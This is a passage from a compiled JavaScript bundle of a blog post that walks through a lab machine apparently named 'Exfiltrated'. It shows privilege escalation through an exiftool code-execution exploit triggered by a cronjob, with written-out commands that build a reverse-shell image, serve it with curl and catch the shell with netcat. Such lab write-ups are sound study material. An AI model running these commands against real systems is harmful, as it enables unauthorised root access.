directory shows that it is executing the command ",a.createElement(n.code,null,"exiftool")," on ",a.createElement(n.code,null,"jpg")," files in the ",a.createElement(n.code,null,"/uploads")," directory\n",a.createElement(n.span,{dangerouslySetInnerHTML:{__html:'<span\n      class="gatsby-resp-image-wrapper"\n      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 804px; "\n    >\n      <span\n    class="gatsby-resp-image-background-image"\n    style="padding-bottom: 69.16666666666667%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAOCAYAAAAvxDzwAAAACXBIWXMAABYlAAAWJQFJUiTwAAACd0lEQVR42l1U2XLbMAz0lzR25EOKJVEndViHZVmy4yRO2mlnMn3p/3/FdkEfzfQBg4PgEuQCnGTFDmU9Yrt7Qde/Iit7OG4Ge53iydNYPSVYOTGeXE0/M77oy3qGtS+xGI8LZWQSpw3SbAud76DCEoluaXfwggIxbS8ozaYgqhAlNVw/NzkqYi73pcx1VYHZ3L8A+jGTwg0cJtoUsSWmN3tE3CB2zE1h2uKSWyItekQEddwUAWM+Y9byWqFnB/BWPnyjFXyKaOUEFHWP+TZjtjK5gRPCcSJYqxALO8Kc+n7lt6LG2A6owhybKEerK3RZbWQrQn9XNGjSDX2u5Q36tIBeufg2J8j1qnfAoy7RM6lSKepAo0sK7HMCUUus9GJUwWVNpOGhjUoQsdIHAlhfwAxg051QVoORYTyj2R5Rt0eyfjJEuCRErjW1PMwsn+IZAmb/Ad0BpU22/QsKtk4/vqPbv6ImaEvAhGQ4bBcBNCBf5HZVaxkYf2qJ72OyZi957LclF1wvhWK7uPRFO+yvJcFML9IWLf0nthzyyD1SucPY7eDJZ7vFr+EZf87f8d50OGQbfI7P+NkN1Cf83o+oWX23f0PVHjAcP9DymSo+y3D4QJRe2iZk+xjAAwk4JDl+lBXeshKDijAKq3GOnbAaZWZKgrgyen2dDsV+FRFbqpxe33ZiqxInXeCcb3CuWrzGGpuiQ9W9QPN9EzaxTExOW0iSZpYJERIlfnvfOylSrq9yzC0XCz7qgkFh8uHRNafe9K2C2dW+kPCPXSHHAGp+DhnHTGZWZlJGSq4nVUgHyOeRc93n9aRCbT6TweQo+lJlzLF0WZRc+S9rGL65MFkwSQAAAABJRU5ErkJggg==\'); background-size: cover; display: block;"\n  ></span>\n  <img\n        class="gatsby-resp-image-image"\n        alt="image-exif"\n        title=""\n        src="/static/2e92b7353585a5b116e2f3dd23fa510d/84c27/image-exif.png"\n        srcset="/static/2e92b7353585a5b116e2f3dd23fa510d/5243c/image-exif.png 240w,\n/static/2e92b7353585a5b116e2f3dd23fa510d/ab158/image-exif.png 480w,\n/static/2e92b7353585a5b116e2f3dd23fa510d/84c27/image-exif.png 804w"\n        sizes="(max-width: 804px) 100vw, 804px"\n        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"\n        loading="lazy"\n        decoding="async"\n      />\n    </span>'}})),"\n",a.createElement(n.h4,null,"Exiftool Arbitrary Code Execution"),"\n",a.createElement(n.p,null,"Searching for an exiftool exploit, we come across the following ",a.createElement(n.a,{href:"https://www.exploit-db.com/exploits/50911"},"Arbitrary Code Execution")," script"),"\n",a.createElement(n.ul,null,"\n",a.createElement(n.li,null,"this script will generate an image that will be processed by the cronjob"),"\n",a.createElement(n.li,null,"run the script using ",a.createElement(n.code,null,"-s")," flag for reverse shell and your kali IP and port"),"\n",a.createElement(n.li,null,"running the command ",a.createElement(n.code,null,"searchsploit exiftool")," will result in the same script"),"\n",a.createElement(n.li,null,"download the script with ",a.createElement(n.code,null,"searchsploit -m linux/local/50911.py")),"\n"),"\n",a.createElement(n.pre,null,a.createElement(n.code,null,"python3 50911.py -s 192.168.45.185 4444\n")),"\n",a.createElement(n.p,null,"Move to the ",a.createElement(n.code,null,"/var/www/html/subrion/uploads/")," directory on the target then download the processed image from host"),"\n",a.createElement(n.ul,null,"\n",a.createElement(n.li,null,"start python server in the directory with the image ",a.createElement(n.code,null,"python3 -m http.server 80")),"\n",a.createElement(n.li,null,"then, the curl command below will download and save the image file into the directory that the cronjob is processing"),"\n"),"\n",a.createElement(n.pre,null,a.createElement(n.code,null,"curl http://<kali_ip>/image.jpg -o image.jpg\n")),"\n",a.createElement(n.p,null,"Start a netcat listener on port specified when creating the ",a.createElement(n.code,null,"image.jpg")," file"),"\n",a.createElement(n.ul,null,"\n",a.createElement(n.li,null,"In my case, port 4444."),"\n"),"\n",a.createElement(n.pre,null,a.createElement(n.code,null,"nc -lnvp 4444\n")),"\n",a.createElement(n.ul,null,"\n",a.createElement(n.li,null,"then wait for the cronjob to fire\n",a.createElement(n.span,{dangerouslySetInnerHTML:{__html:'<span\n      class="gatsby-resp-image-wrapper"\n      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; "\n    >\n      <span\n    class="gatsby-resp-image-background-image"\n    style="padding-bottom: 19.166666666666664%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAYAAACOXx+WAAAACXBIWXMAABYlAAAWJQFJUiTwAAAAz0lEQVR42kWQa5KCMBCEuYgrqIWPFcQ8SARDiOCu7lKl979MOwlS/uj6qmcmM9WJUtZie6ywETWkdsh5jdWGYZkWiJcZ5l6LPWbxd1D89pO8j1f5SFLU/z5xtjdo8wPXD7CXP7hugKGaUA68bIltqLXdP5hsoKoLSjouqX8UDcmEumd0bXqcCgUrTuD8jKwgljY0D6wO9F5XHXTdo6CZaWFOyVJKk2451jseGA3G4a4NHlJBK1okbXjkhwV5Jj/L54vxC76SKXKGhOImIfLIF04df4MrxMXUAAAAAElFTkSuQmCC\'); background-size: cover; display: block;"\n  ></span>\n  <img\n        class="gatsby-resp-image-image"\n        alt="root"\n        title=""\n        src="/static/8ee388a02ef464bac7126ea1188c3914/7d769/root.png"\n        srcset="/static/8ee388a02ef464bac7126ea1188c3914/5243c/root.png 240w,\n/static/8ee388a02ef464bac7126ea1188c3914/ab158/root.png 480w,\n/static/8ee388a02ef464bac7126ea1188c3914/7d769/root.png 960w,\n/static/8ee388a02ef464bac7126ea1188c3914/84390/root.png 968w"\n        sizes="(max-width: 960px) 100vw, 960px"\n        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"\n        loading="lazy"\n        decoding="async"\n      />\n    </span>'}})),"\n"),"\n",a.createElement(n.h1,null,"Summary"),"\n",a.createElement(n.p,null,'The blog post "Exfiltrated" outlines the exploitation of a Linux machine by leveraging an arbitrary file upload vulnerability in Subrion CMS v4.2.1. The author gains initial access as www-data through a modified Python script, further enhancing control with a PHP reverse shell. Privilege escalation is achieved by exploiting a cronjob through a crafted image file, ultimately securing root access on the target machine.'),"\n",a.createElement(n.p,null,"Join me for the next machine soon for more exciting challenges and security insights!"),"\n",a.createElement(n.p,null,"+10 points"))}var r=function(e){void 0===e&&(e={});const{wrapper:n}=Object.assign({},(0,l.ah)(),e.components);return n?a.createElement(n,e,a.createElement(i,e)):i(e)},s=t(4765);function o(e){return a.createElement(s.Z,e,a.createElement(r,e))}s.Z}}]);
//# sourceMappingURL=component---node-modules-lekoarts-gatsby-theme-minimal-blog-core-src-templates-post-query-tsx-content-file-path-content-posts-exfiltrated-index-mdx-c8eb894550184423144b.js.map